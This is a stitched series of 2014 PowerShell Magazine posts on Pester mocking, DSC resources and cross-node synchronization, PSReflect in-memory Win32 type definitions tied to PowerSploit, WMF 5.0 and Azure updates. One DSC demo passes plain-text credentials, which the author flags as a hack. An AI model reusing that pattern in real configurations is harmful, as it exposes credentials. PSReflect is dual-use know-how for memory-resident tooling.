whole framework, the Mock function. This function lets you hide any function with a fake implementation of your choosing, count how many times it was called and filter on parameters of the call. This comes in handy when you need to force the code under test to a stable predefined state. In other words detach it from real world resources.\nBefore we have a deeper look at how exactly the Mock is used there are two things you should know: The version of Pester used in this article is the stable 2.0.1+ version you can find in the master branch on Github. There is also a new 3.0.2 version available in the master branch, packing a lot of new exciting features, but bringing few breaking changes at the same time. To keep all the information in the previous two articles relevant I decided to use the same major version as with the previous two articles.\nThe second thing is: Testing your code with PowerShell is difficult, because PowerShell is all about dealing with real world resources. Such resources are files for example. A file can be deleted, renamed, moved, locked for access or made unavailable in a different way. Not being certain about the environment in which our tests run is a huge problem. After all, we want our test suite to be as stable and as independent from the real world as possible. Actually each of our tests should test only one aspect of the problem and all the other aspects should be stable. The Mock function helps us with this to some extent but you should always keep in mind that every use of Mock puts you in danger of replacing the real command with an inaccurate representation of it. Make sure you recognize the boundaries between your script and the real-world and make sure you replace and test these connections super-carefully.\nNow before boring you to death let’s see some code:\nfunction Restart-InactiveComputer { if (-not ( Get-Process explorer -ErrorAction SilentlyContinue ) ) { Restart-Computer -Force } }  This function does pretty much what its name says–it restarts the computer when there is no user logged on. To be exact, it uses Explorer.exe process to determine if any user is logged on. If there is no Explorer.exe running there is no user logged on. This function is saved in Restart-InactiveComputer.ps1 file.\nFor the end-user this function is super-easy to use as there are no parameters. For us testers it is impossible to test with our current skill set. The reason why, is that we can’t easily control the number of Explorer.exe processes running, and even if we somehow executed the test without having the Explorer process running it would only result in restarting the station. Not exactly what you want to do every time you run your test suite.\nSo now that we identified the boundaries, we have to replace them with appropriate mocks. The Restart-Computer should ideally do nothing, but we still need a way to figure out if it was called so for the time being we make it to return “Restarting!” when called:\nMock Restart-Computer { “Restarting!” }  Don’t run the code just yet it will fail if you run it outside a Describe block.\nThe Get-Process is used in an if condition so to test it we should have at least two different versions of the command: one that returns nothing and one that returns something.\nMock Get-Process {} Mock Get-Process { $true }  Please notice that I am not creating a new System.Diagnostics.Process object in the mocks, nor any special kind of object. I am just returning the plain minimum to control the result of the if condition, that is returning nothing and returning $true. And by the way you don’t have to use the curly brackets if you define empty mock, but I do because it makes the Mock easier to identify when you skim the code.\nNow that we have all the basic building blocks let’s put them in a fixture and save it to a file called Restart-InactiveComputer.Tests.ps1:\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path $sut = (Split-Path -Leaf $MyInvocation.MyCommand.Path).Replace(\".Tests.\", \".\") . \"$here\\$sut\" Describe \"Restart-InactiveComputer\" { Mock Restart-Computer { \"Restarting!\" } It \"Restarts the computer\" { Mock Get-Process {} Restart-InactiveComputer | Should be “Restarting!” } It \"Does not restart the computer if user is logged on\" { Mock Get-Process { $true } Restart-InactiveComputer | Should BeNullOrEmpty } }  As you can see both of the tests are green and that means they passed.\nAssert-MockCalled In the previous example we used the output of the mocked Restart-Computer function to check if the function was called or not. This is possible in the simplest of cases but if the output of Restart-Computer was piped to Out-Null, and so the output was discarded this would not be possible. Fortunately Pester provides Assert-MockCalled function that helps you count how many times a Mock was called.\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path $sut = (Split-Path -Leaf $MyInvocation.MyCommand.Path).Replace(\u0026quot;.Tests.\u0026quot;, \u0026quot;.\u0026quot;) . \u0026quot;$here\\$sut\u0026quot; Describe \u0026quot;Restart-InactiveComputer\u0026quot; { Mock Restart-Computer { \u0026quot;Restarting!\u0026quot; } It \u0026quot;Restarts the computer\u0026quot; { Mock Get-Process {} Restart-InactiveComputer | Out-Null Assert-MockCalled Restart-Computer -Exactly 1 } It \u0026quot;Does not restart the computer if user is logged on\u0026quot; { Mock Get-Process { $true } Restart-InactiveComputer | Out-Null Assert-MockCalled Restart-Computer -Exactly 0 } } Which yields these results:\nPS C:\\temp\\example1\u0026gt; Invoke-Pester Executing all tests in C:\\temp\\example1 Describing Restart-InactiveComputer [+] Restarts the computer 6ms [-] Does not restart the computer if user is logged on 12ms Expected Restart-Computer to be called 0 times exactly but was called 1 times at line: 393 in C:\\temp\\example1\\Restart-InactiveComputer.Tests.ps1 Tests completed in 19ms Passed: 1 Failed: 1  As you can see the last tests failed, because the Restart-Computer command was called once but it should not been called at all. There isn’t any problem in the test case itself. We are hitting Pester 2.0 limitation here. The Mock call history is shared through the Context and there is no way to change it. So the only way around this is to define a Context for each of the tests:\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path $sut = (Split-Path -Leaf $MyInvocation.MyCommand.Path).Replace(\u0026quot;.Tests.\u0026quot;, \u0026quot;.\u0026quot;) . \u0026quot;$here\\$sut\u0026quot; Describe \u0026quot;Restart-InactiveComputer\u0026quot; { Mock Restart-Computer { \u0026quot;Restarting!\u0026quot; } Context \u0026quot;Computer should restart\u0026quot; { It \u0026quot;Restarts the computer\u0026quot; { Mock Get-Process {} Restart-InactiveComputer | Out-Null Assert-MockCalled Restart-Computer -Exactly 1 } } Context \u0026quot;Computer should not restart\u0026quot; { It \u0026quot;Does not restart the computer if user is logged on\u0026quot; { Mock Get-Process { $true } Restart-InactiveComputer | Out-Null Assert-MockCalled Restart-Computer -Exactly 0 } } } PS C:\\temp\\example1\u0026gt; Invoke-Pester Executing all tests in C:\\temp\\example1 Describing Restart-InactiveComputer Context Computer should restart [+] Restarts the computer 6ms Context Computer should not restart [+] Does not restart the computer if user is logged on 5ms Tests completed in 11ms Passed: 2 Failed: 0 And finally both of the tests pass.\nDefault and filtered mocks So far we only used default mocks. Any call to the Get-Process cmdlet was replaced by the call to the mocked version of the cmdlet. This is enough for testing our idealized example function but in real life you need more control. For this reason there is -ParameterFilter parameter for the Mock and the Assert-MockCalled functions. This parameter lets you select the appropriate mock based on the parameters used when calling the command. The usage is the following:\nMock Get-Process { \u0026quot;default\u0026quot; } Mock Get-Process { \u0026quot;filtered\u0026quot; } -ParameterFilter { $Name -eq \u0026quot;Explorer\u0026quot; } and here are tests using the mocks, verifying the results of the calls:\nDescribe \u0026quot;MultipleMocks\u0026quot; { Mock Get-Process { “default” } Mock Get-Process { “filtered” } -ParameterFilter { $Name -eq \u0026quot;Explorer\u0026quot; } It \u0026quot;Calls the default mock\u0026quot; { Get-Process | Should Be \u0026quot;default\u0026quot; } It \u0026quot;Also calls the default mock\u0026quot; { Get-Process -Name Idle | Should Be \u0026quot;default\u0026quot; } It \u0026quot;Calls the filtered mock\u0026quot; { Get-Process -Name Explorer | Should Be \u0026quot;filtered\u0026quot; } } PS C:\\temp\\example2\u0026gt; Invoke-Pester Executing all tests in C:\\temp\\example2 Describing MultipleMocks [+] Calls the default mock 8ms [+] Also calls the default mock 2ms [+] Calls the filtered mock 5ms Tests completed in 15ms Passed: 3 Failed: 0 This way you can simply define a one default “fallback” mock that keeps you safe if something goes wrong. (Like keeping your station from being restarted.) And then create multiple less general mocks that target each call to the command specifically. But you don’t have to create a default mock at all, if you don’t need to.\nThis brings us to describing in which order the filtered and default mocks are evaluated and what scope rules are used.\nMock evaluation order There are basically two stacks of Mocks in Pester for each mocked command. One stacking the default mocks and one stacking the filtered mocks. In reality this means that the last filtered Mock to be defined is the first to be evaluated. And the same holds true for the default mocks, but the filtered mocks are always evaluated first. If a mocked command is called, Pester goes through all the filtered mocks and checks if any of the filters returns true and uses that Mock. If no matching filtered Mock is found it looks for a default Mock to use. If there is none the original command is used.\nMock scoping The last set of rules you should keep in mind are the scoping rules that apply to mocks and mock call assertions. They complicated our lives already when we tried to assert on a mock call count in the first example, and they may produce all kinds of unexpected results if you are not aware of them:\n  Mock defined in Describe is available in the whole Describe.\n  Mock defined in Context is available in the whole Context.\n  Mock defined in It is available in its parent scope. That is in whole Context if the It is placed in a Context, and in whole describe if the It is placed in a Describe.\n  Now for our final example let’s see another version of the first example which targets the mocks and assertions more precisely, making sure the commands are called with the correct parameters:\n$here = Split-Path -Parent $MyInvocation.MyCommand.Path $sut = (Split-Path -Leaf $MyInvocation.MyCommand.Path).Replace(\u0026quot;.Tests.\u0026quot;, \u0026quot;.\u0026quot;) . \u0026quot;$here\\$sut\u0026quot; Describe \u0026quot;Restart-InactiveComputer\u0026quot; { Mock Restart-Computer { \u0026quot;Restarting!\u0026quot; } Context \u0026quot;Computer should restart\u0026quot; { It \u0026quot;Restarts the computer\u0026quot; { Mock Get-Process {} -ParameterFilter { $Name -eq \u0026quot;Explorer\u0026quot; } Restart-InactiveComputer | Out-Null Assert-MockCalled Restart-Computer -Exactly 1 -parameterFilter { $Force } } } Context \u0026quot;Computer should not restart\u0026quot; { It \u0026quot;Does not restart the computer if user is logged on\u0026quot; { Mock Get-Process { $true } -ParameterFilter { $Name -eq \u0026quot;Explorer\u0026quot; } Restart-InactiveComputer | Out-Null Assert-MockCalled Restart-Computer -Exactly 0 -parameterFilter { $Force } } } } PS C:\\temp\\example3\u0026amp;gt; Invoke-Pester Executing all tests in C:\\temp\\example3 Describing Restart-InactiveComputer Context Computer should restart [+] Restarts the computer 5ms Context Computer should not restart [+] Does not restart the computer if user is logged on 6ms Tests completed in 11ms Passed: 2 Failed: 0 TestDrive Working with temporary files is always a hassle, you have to create a temporary file storage, resolve any naming conflicts and clean up when you are done. Fortunately all this is done automatically by Pester and exposed as a PSDrive called TestDrive. A storage that you can use to isolate your test files from the environment.\nTestDrive:\\test_file.txt | Should Exist  A basic scoping rules are implemented for the TestDrive. A clean TestDrive is created for every Describe and all the files created are available in the whole Describe scope. If the Context keyword is also used the state of the TestDrive is recorded before moving into the Context block. Inside the Context block the files from the Describe scope are available for reading and modification. You can move them around and create new ones as well.\nOnce the Context block is finished all the files created inside that block are deleted, leaving only the files created in the Describe block. When the Describe block is finished all contents of the TestDrive are discarded.\nRecording the state of the drive is done by saving a list of the files and folders present on the drive. No snapshots or any other magic is done. In practice this means that if you create a file in the Describe block and then change its content inside the Context block, the modifications are preserved even after you left the Context block.\nInternally the TestDrive creates a randomly named folder placed in $env:Temp for every Describe and links it to the TestDrive PSDrive. Making the folder names random enables you to run multiple instances of Pester in parallel, as long as they are running as separate processes. That means running in different PowerShell.exe sessions or running using PowerShell jobs.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/09/30/pester-mock-and-testdrive/","tags":["Pester","DevOps"],"title":"Pester Mock and TestDrive"},{"categories":["PowerShell DSC"],"contents":"If you have missed the announcement, Powershell team released wave 7 of the DSC Resource Kit just before the weekend.\nThis wave has added the following:\n xPendingReboot examines three specific registry locations where a Windows Server might indicate that a reboot is pending and allows DSC to predictably handle the condition xCredSSP enables or disables the server and client CredSSP roles on a system. xAdcsCertificationAuthority this resource installs and configures the Certificate Authority role on a Windows Server. xAdcsWebEnrollment this resource configures Certificate Services Web Enrollment on a Windows Server following installation of the component using the WindowsFeature resource.  Out of the four new DSC resources, the xPendingReboot resource is of immediate use for me. I build VMs for my lab quite often and having the newest DSC bits is a must for me. And, what is the better way than using DSC for installing WMF? 🙂\nIf you have installed WMF bits in the past, you will know that it requires a reboot at the end of installation procedure. xHotfix resource in the xWindowsUpdate module triggers a reboot if a Windows update requires doing so. This is where xPendingReboot is useful. If Local Configuration Manager (LCM) is already configured to reboot the node as needed (RebootNodeIfNeeded is set to True), this resource can be used to induce the restart after WMF install. This resource does that by changing the $Global:DSCMachineStatus variable to 1.\nSo, here is the configuration script I created for the purpose of installing WMF 5.0 bits on my lab systems. This requires xPendingReboot and xWindowsUpdate resource from the DSC Resource Kit.\nUpdate: xHotfix can reboot a system if a Windows Update package install requires reboot. Therefore, using xPendingReboot is not necessary.\nNote: DSC Resource Kit wave 7 release excluded the xWindowsUpdate resource for some reason. If you don’t have it on your system, you can download it from http://gallery.technet.microsoft.com/xWindowsUpdate-Module-with-5af00a7f. Also, note that these resources must be present on the target systems where you are installing WMF 5.0 using DSC.\nUpdate: xWindowsUpdate resource is now added to the wave 7 resource kit download.\nOnce you have the DSC resources copied to the VM, you can use the following configuration script that I created for installing WMF 5.0 using xWindowsUpdate and xPendingReboot resources.\nConfiguration WMF5Sep14Install { Import-DscResource -ModuleName xWindowsUpdate, xPendingReboot Node localhost { xHotfix HotfixInstall { Path = 'C:\\Hotfix\\KB2969050-x64.msu' Id = 'KB2969050' Ensure = 'Present' } } } WMF5Sep14Install In the above example, I have downloaded the MSU package and stored it in C:\\Hotfix folder. So, I provided that path as the value of Path property in the xHotfix resource configuration. When we enact this configuration using the Start-DscConfiguration cmdlet, we will see that the MSU gets installed and then a reboot gets induced if you have set the LCM to reboot as needed or a message will be displayed that a reboot is pending.\nWMF 5.0 in this article is just an example. You can use this method to perform any number of MSU installs and actually perform the reboot as required.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/09/29/installing-wmf-5-0-preview-september-2014-using-dsc-xwindowsupdate-and-xpendingreboot-resources/","tags":["PowerShell DSC"],"title":"Installing WMF 5.0 Preview September 2014 using DSC xWindowsUpdate resource"},{"categories":["PowerShell DSC"],"contents":"I had earlier ranted about why DSC is not an orchestrator and that I posted a connect suggestion to add inter-node dependency in DSC. If you have been following WMF 5.0 preview releases, this feature came in the September 2014 release. I still believe that end-to-end orchestration is a layer above configuration management. That said, this new feature–called cross-computer synchronization–can be effectively used to validate if a dependent configuration on remote system exists before configuring the local system for any resource.\nLet us take a hypothetical example. Note that this is not a real-world scenario, but just an example to demonstrate the concepts.\nI have two nodes–WMF5-3 and WMF5-4. I want to create a configuration script for WMF5-3 to start Windows Audio service. But before this, I want to ensure that the Windows Audio service on WMF5-4 is in running state. In the earlier releases of DSC this is not possible. With WMF 5.0 Preview September 2014, there are three new built-in resources that help us with cross-computer synchronization.\n WaitForAll WaitForAny WaitForSome  We will get into details of each of these resources in a different article. For this post, let’s use the WaitForAll resource.\nLooking at the syntax for the WaitForAll resource, we understand that the NodeName, ResourceName, and Credential are the mandatory properties. The NodeName property is used to specify the name of the remote system on the which the dependent resource should be configured. The ResourceName property is used to specify a list of resources that should be configured.\nHere is a sample configuration script that I created to demonstrate this feature.\n$ConfigData = @{ AllNodes = @( @{ NodeName = \u0026quot;*\u0026quot;; PsDscAllowPlainTextPassword = $true }, @{ NodeName = \u0026quot;WMF5-3\u0026quot; } ) } configuration ComputerSyncPUSH { Node $AllNodes.NodeName { WaitForAll AudioSrv { ResourceName = '[Service]AudioSrv' NodeName = 'WMF5-4' RetryIntervalSec = 5 RetryCount = 3 Credential = (Get-Credential) } Service AudioSrv { Name = \u0026quot;AudioSrv\u0026quot; State = \u0026quot;Running\u0026quot; } } Node WMF5-4 { Service AudioSrv { Name = \u0026quot;AudioSrv\u0026quot; State = \u0026quot;Running\u0026quot; } } } ComputerSyncPUSH -ConfigurationData $ConfigData  This is a simple configuration script where we defined that the configuration on node WMF5-3 depends on the AudioSrv configuration on node WMF5-4. This is defined using the WaitForAll resource. Also, observe that we are passing plain-text credentials by specifying PsDscAllowPlainTextPassword property in the DSC configuration data. This is not the best practice but just a quick hack for this demo.\nNow, we need to deliver this configuration. In today’s article, we will see only the push mode of configuration delivery. The pull mode requires more discussion, so let’s save it for another day.\nOne thing you should note here is that the configuration MOF files generated using the above configuration script must exist in the same folder. Once the MOF is generated, we can use the Start-DscConfiguration cmdlet to push this configuration. The following screenshot shows only a specific part of the output which is necessary for our discussion.\nAs you see in the output, the PSDSCxMachine.psm1 module gets loaded. This module implements the function for performing cross-computer synchronization and the WaitForAll, WaitForAny, and WaitForSome resources call the functions in this module. Once the module is loaded, remote resource is checked for desired state. If the remote resource is not in desired state, it gets configured. The retry interval and retry count specified in the WaitForAll resource configuration decides how long the remote Local Configuration Manager (LCM) waits before it either declares a failure or success of the overall configuration change.\nSo, this is how the cross-computer synchronization is done in WMF 5.0 Preview September 2014. We will see more about this feature and other changes in DSC in upcoming articles.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/09/26/inter-node-dependency-and-cross-computer-synchronization-with-dsc/","tags":["PowerShell DSC"],"title":"Inter-node dependency and cross-computer synchronization with DSC"},{"categories":["News"],"contents":"Time just flies. On 13th of this month, PowerShell Magazine completed 3 years of publishing exclusive PowerShell content. This was possible because of ever growing support from our awesome contributors. This has been an eventful year.\n We’ve added over 10 new contributing authors in the last year. We’ve added 3 new editors–the all star team, I must say–Tobias, Jan, and Bartek joined us. They have been exclusively writing for PowerShell Magazine ever since. We’ve had close to million views the previous year for the 193 posts and the total number of posts crossed the 600 milestone. This includes the PowerShell tips and tricks series and multiple series of focused articles. We have a very active series on Desired State Configuration and Azure. The PowerShell security special series was an instant hit. In fact, the articles in the security series had an aggregate of over 50000 views in just a span of two weeks. We updated the Quick Reference Quides for PowerShell 4.0  Publishing magazine content in eReader and PDF formats is still a dream that we are chasing. This needs more than just active reader and contributor base. We are actively exploring options to make this reality. In the coming year, you will also see us deliver new features on the site. Stay tuned for that.\nBy the way , if you want to be a contributor, just head to ‘Write for us‘ and submit a proposal! And, if you have any feedback or suggestions, please use the feedback form. We would love to hear from you.\nWe want to take this opportunity to thank and congratulate the community members who made this venture a success. We are looking forward to strengthening this community and I am sure we have a great year ahead.\nHappy Birthday, PowerShell Magazine!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/09/25/powershell-magazine-completes-3-years/","tags":["News"],"title":"PowerShell Magazine completes 3 years!"},{"categories":["How To","Security","InfoSec"],"contents":"In the past, I’ve spoken extensively on how to use reflection to define enums, structs, and Win32 functions in PowerShell and the merits of doing so. PowerSploit is also heavily reliant upon these techniques in order to perform low-level operations while remaining entirely memory-resident.\nThose familiar with using reflection to create .NET types on the fly (i.e. Boe Prox, Joe Bialek, Will Schroeder, etc.) probably know how frustrating it is due to all the ceremony involved in having to control every nuance of the type being created. Fed up with the amount of work involved and considering I have a unique requirement to use reflection so often in my scripts, I needed a way to ease the process of defining in-memory enums, structs, and Win32 functions. I had the following design goals in mind:\n Create intuitive wrapper functions around all the reflection code Be able to declare enum, struct, and Win32 function definitions in as close to a “C-style” as PowerShell would allow – i.e. sometimes disregarding PowerShell best practices. Structs should be aware of their size, eliminating the need to constantly call [Runtime.InteropServices.Marshal]::SizeOf in my scripts. Structs should allow for explicit conversion from an IntPtr, eliminating the need to constantly call [Runtime.InteropServices.Marshal]::PtrToStructure in my scripts. Maintain PowerShell 2.0 compatibility  PSReflect Introducing PSReflect–a series of helper functions designed to make defining in-memory enums, structs, and Win32 functions extremely easy.\nPSReflect consists of the following helper functions:\nNew-InMemoryModule – Creates a host in-memory assembly and module Add-Win32Type \u0026#8211; Creates a .NET type for an unmanaged Win32 function func – A helper function for Add-Win32Type that can be sued to eliminate typing when defining a large quantity of Win32 function definitions enum \u0026#8211; Creates an in-memory enumeration for use in your PowerShell session struct \u0026#8211; Creates an in-memory structure for use in your PowerShell session field \u0026#8211; A helper function for struct used to reduce typing while defining struct fields Starting Out Before you can define anything, you must create an assembly and module that will host your enums, structs, and Win32 functions. It is really easy to create an in-memory assembly and module with the New-InMemoryModule function.\n$Mod = New-InMemoryModule  Assemblies and modules require a name. If the ‘ModuleName’ parameter is not specified, it will create a GUID and use that as the name. With our in-memory module set up, we can now begin defining everything else.\nEnums Defining enums couldn’t be easier. Here is an example enum definition:\n$ImageDosSignature = enum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{ DOS_SIGNATURE = 0x5A4D OS2_SIGNATURE = 0x454E OS2_SIGNATURE_LE = 0x454C VXD_SIGNATURE = 0x454C }  Enums require the following components:\n The in-memory module defined earlier The full name (i.e. name and optionally, a namespace) of the enum The underlying type of the enum elements A hash table consisting of the enum elements  You can also optionally specify the following component:\n Specify that the enum is a bitfield. This enables you to create and display an enum consisting of multiple elements binary OR’ed together.  Structs Structs are also now very easy to define, although the struct fields will require a little bit more information than a simple enum.\n$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{ e_magic = field 0 $ImageDosSignature e_cblp = field 1 UInt16 e_cp = field 2 UInt16 e_crlc = field 3 UInt16 e_cparhdr = field 4 UInt16 e_minalloc = field 5 UInt16 e_maxalloc = field 6 UInt16 e_ss = field 7 UInt16 e_sp = field 8 UInt16 e_csum = field 9 UInt16 e_ip = field 10 UInt16 e_cs = field 11 UInt16 e_lfarlc = field 12 UInt16 e_ovno = field 13 UInt16 e_res = field 14 UInt16[] -MarshalAs @('ByValArray', 4) e_oemid = field 15 UInt16 e_oeminfo = field 16 UInt16 e_res2 = field 17 UInt16[] -MarshalAs @('ByValArray', 10) e_lfanew = field 18 Int32 }  Structs require the following components:\n The in-memory module defined earlier The full name (i.e. name and optionally, a namespace) of the struct A hash table of the individual fields  You can also optionally specify the following components:\n Packing size – i.e. the memory alignment of the fields Explicit layout – Indicates that an explicit offset for each field will be specified  Each struct field is a hash table that requires the following components:\n The order in which the field should be defined. Unfortunately, this cannot be omitted because PowerShell doesn’t not guarantee the order of defined elements in a hash table. Starting in PowerShell 3.0, you can prepend [Ordered] to a hash table but that is not possible in PowerShell 2.0. The order in which fields are defined is essential, whereas with an enum, the order doesn’t matter. The .NET type of the field  Optionally, struct fields may also contain the following components:\n An explicit offset. If you indicate that your struct has an explicit layout, you must specify the offset of each field. An example of when you would want to use explicit offsets is when creating a union. PowerShell/.NET isn’t aware of the concept of a C union but you can define an equivalent – a struct with overlapping fields. A MarshalAs attribute. This is required if your struct contains a string or an array of objects. You have to use the MarshalAs attribute to indicate the ‘unmanaged’ type and its size. For more information on this attribute, read this MSDN article (http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.unmanagedtype.aspx).  Since each field of the struct is another hash table, I wrote the ‘field’ helper function to reduce the typing required.\nOnce your struct is defined, it behaves exactly the way you would expect only it has two additional features:\n It comes with a built-in GetSize method which returns the size of the struct in bytes. It comes with a built-in explicit IntPtr conversion operator. This means that you can cast an IntPtr to your struct type. This is very useful for me since many of my scripts contain calls to [Runtime.InteropServices.Marshal]::PtrToStructure. Having a built-in converter save a lot of typing.  Win32 Functions When using Add-Win32Type, it will be easiest to define your functions as an array of function declarations:\n$FunctionDefinitions = @( (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String])), (func kernel32 GetModuleHandle ([Intptr]) @([String])), (func ntdll RtlGetCurrentPeb ([IntPtr]) @()) ) $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32' $Kernel32 = $Types['kernel32'] $Ntdll = $Types['ntdll'] Each function declaration requires the following:\n The name of the DLL The name of the DLL’s exported function The return value of the function An array of parameters that the function expects. If the function doesn’t have any parameters, just provide an empty array.  Optionally, you may also specify the following properties:\n The native calling convention – The default is stdcall but you may also specify cdecl or thiscall. Unfortunately, .NET does not support the X86 fastcall calling convention. The character set – If you want to explicitly call an ‘A’ or ‘W’ version of a function, you can specify either an ANSI or Unicode character set.  Once your function declarations are defined, you bake everything in with the Add-Win32Type function at which point you provide your in-memory module defined earlier and optionally, a namespace for each type.\nAfter the Win32 type are created, Add-Win32Type returns a hash table of each type corresponding to each DLL name.\nTying everything together Now that we have all the requirements under our belt, we can start building some cool tools around this capability. Without further ado, I present to you a very basic PE DOS header parser – the “Hello, World” of working with structs in Windows. 😉\n$Mod = New-InMemoryModule -ModuleName Win32 $ImageDosSignature = enum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{ DOS_SIGNATURE = 0x5A4D OS2_SIGNATURE = 0x454E OS2_SIGNATURE_LE = 0x454C VXD_SIGNATURE = 0x454C } $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{ e_magic = field 0 $ImageDosSignature e_cblp = field 1 UInt16 e_cp = field 2 UInt16 e_crlc = field 3 UInt16 e_cparhdr = field 4 UInt16 e_minalloc = field 5 UInt16 e_maxalloc = field 6 UInt16 e_ss = field 7 UInt16 e_sp = field 8 UInt16 e_csum = field 9 UInt16 e_ip = field 10 UInt16 e_cs = field 11 UInt16 e_lfarlc = field 12 UInt16 e_ovno = field 13 UInt16 e_res = field 14 UInt16[] -MarshalAs @('ByValArray', 4) e_oemid = field 15 UInt16 e_oeminfo = field 16 UInt16 e_res2 = field 17 UInt16[] -MarshalAs @('ByValArray', 10) e_lfanew = field 18 Int32 } $FunctionDefinitions = @( (func kernel32 GetModuleHandle ([Intptr]) @([String])) ) $Type = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace Win32 $Kernel32 = $Type['kernel32'] # Parse the DOS header of every loaded module in the PowerShell process $PowerShellProc = Get-Process -Id $PID $PowerShellProc.Modules | % { $Kernel32::GetModuleHandle($_.ModuleName) -as $ImageDosHeader } PowerShell 2.0 Quirks In every example provided, particular attention was paid to writing examples that specifically worked in PowerShell 2.0 and later. Specifically, all types must be saved to variables. In PowerShell 2.0, a bug exists where if you create a type using reflection, you cannot explicitly refer to its type despite it being properly loaded in your PowerShell session. For example, in the previous example, you wouldn’t be able to call [Win32.kernel32]::GetModuleHandle. Rather, in PowerShell 2.0, you have to save each type to a variable when it’s created. In PowerShell 3.0 and later, you can refer to your types explicitly using bracket syntax or via a variable.\nIf you’re in the unique position of needing to define types in memory, hopefully PSReflect will help speed up your workflow.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/","tags":["How To","Security","InfoSec"],"title":"Easily Defining Enums, Structs, and Win32 Functions in Memory"},{"categories":["PowerShell DSC","News"],"contents":"Windows Management Framework 5.0 Preview September 2014 was released on September 4.\nAn overview of new features added since the May 2014 Preview is listed in the announcement on the Windows PowerShell Team blog, while additional details are available in the release notes.\nThere are also some new features not mentioned in the release notes, which we will look at in this article.\nRemote File Editing in PowerShell ISE This feature allows us to edit remote files via PowerShell remoting from the PowerShell ISE.\nTo use Remote File Editing, open a new PSSession using Enter-PSSession and type PSEdit \u0026lt;path to a file\u0026gt;. Here is an example:\nWe can see that the file we’re editing is actually temporary stored in the local AppData folder:\nLooking at the contents of the PSEdit function, we can see that the file content is retrieved in byte format before it’s brought back and forth between the local ISE session and the remote PS session:\nThis can be a very useful feature for working with remote files, especially against Server Core.\nThrottling in Desired State Configuration A new –ThrottleLimit parameter is introduced for 10 commands in the PSDesiredStatedConfiguration module:\nThis parameter enables control over how many nodes to process concurrently; a very useful feature when working with a large number of DSC clients.\nStart-Transcript support in PowerShell ISE Historically the Start-Transcript cmdlet has been supported in the PowerShell Console Host only. If you try to use it in a PowerShell ISE version prior to “5.0 Preview September 2014” you will be presented with the message “This host does not support transcription”.\nIntroduced in the Windows Management Framework 5.0 Preview September 2014, Start-Transcript works in the PowerShell ISE:\nImprovements in COM object performance\nMajor performance improvements for working with COM objects is introduced in this release. PowerShell team member Lee Holmes has published a video demonstrating the improvement.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/09/12/new-features-introduced-in-windows-management-framework-5-0-preview-september-2014/","tags":["PowerShell DSC","News"],"title":"New features introduced in Windows Management Framework 5.0 Preview September 2014"},{"categories":["Azure","News"],"contents":"Just a few hours ago, Azure team released Microsoft Azure PowerShell 0.8.8. The new release has a lot of improvements and added a support for today’s Azure update–Role-Based Access Control in Azure Preview Portal.\nHere is the official change log for version 0.8.8:\n  Role-based access control support\n  Query role definition\n  Get-AzureRoleDefinition\n  Manage role assignment\n  New-AzureRoleAssignment\n  Get-AzureRoleAssignment\n  Remove-AzureRoleAssignment\n  Query Active Directory object\n  Get-AzureADUser\n  Get-AzureADGroup\n  Get-AzureADGroupMember\n  Get-AzureADServicePrincipal\n  Show user’s permissions on\n  Get-AzureResourceGroup\n  Get-AzureResource\n  Active Directory service principal login support in Azure Resource Manager mode\n  Add-AzureAccount -Credential -ServicePrincipal -Tenant\n  SQL Database auditing support in Azure Resource Manager mode\n  Use-AzureSqlServerAuditingSetting\n  Set-AzureSqlServerAuditingSetting\n  Set-AzureSqlDatabaseAuditingSetting\n  Get-AzureSqlServerAuditingSetting\n  Get-AzureSqlDatabaseAuditingSetting\n  Disable-AzureSqlServerAuditing\n  Disable-AzureSqlDatabaseAuditing\n  Other improvements\n  Virtual Machine DSC extension supports PSCredential as configuration argument\n  Virtual Machine Antimalware extension supports native JSON configuration\n  Storage supports creating storage account with different geo-redundant options\n  Traffic Manager supports nesting of profiles\n  Website supports configuring x32/x64 worker process\n  -Detail parameter on Get-AzureResourceGroup to improve performance\n  Major refactoring around account and subscription management\n  The error “Add-AzureAccount: multiple_matching_tokens_detected: The cache contains multiple tokens satisfying the requirements. Call AcquireToken again providing more requirements (e.g. UserId)” that some users have experienced with the Add-AzureAccount cmdlet, and were blocked to work with the Resource Manager in PowerShell, is fixed now.\nThe “Virtual Machine DSC extension supports PSCredential as configuration argument” improvement is covered in detail in today’s post on PowerShell team blog.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/09/10/microsoft-azure-powershell-0-8-8-is-available/","tags":["Azure","News"],"title":"Microsoft Azure PowerShell 0.8.8 is available"},{"categories":["How To"],"contents":"One of PowerShell strengths has always been string manipulation. PowerShell has very good support for regular expressions–using both cmdlets and operators. There are cmdlets to import and export several text file formats: XML, JSON, CSV. I use regular expressions in PowerShell almost every day. There is one problem with regular expressions though: it’s a language that is easier to write than read. And, it can be very complex when you try to process structured text files, especially if structure is not limited to single line and is not in one of natively supported formats.\nNew kid on the block On September 4, a new version of Windows Management Framework 5.0 Preview was announced. This release comes with a cmdlet, ConvertFrom-String, that simplifies processing of any structured text. It does this in a relatively straightforward fashion. You don’t have to be a regex expert to get what you want, you just need to understand output of your command, a content of your log file, a structure of data exported from your database. As long as you can see a pattern and ‘explain it’ to PowerShell, PowerShell will turn a structured text into objects.\nConvertFrom-String has two modes. In the first one (basic delimited parsing) it’s not much different from ConvertFrom-Csv. Processing is performed line by line, and there is no way to identify input header other than using Select-Object -Skip to ignore the first few lines. You can 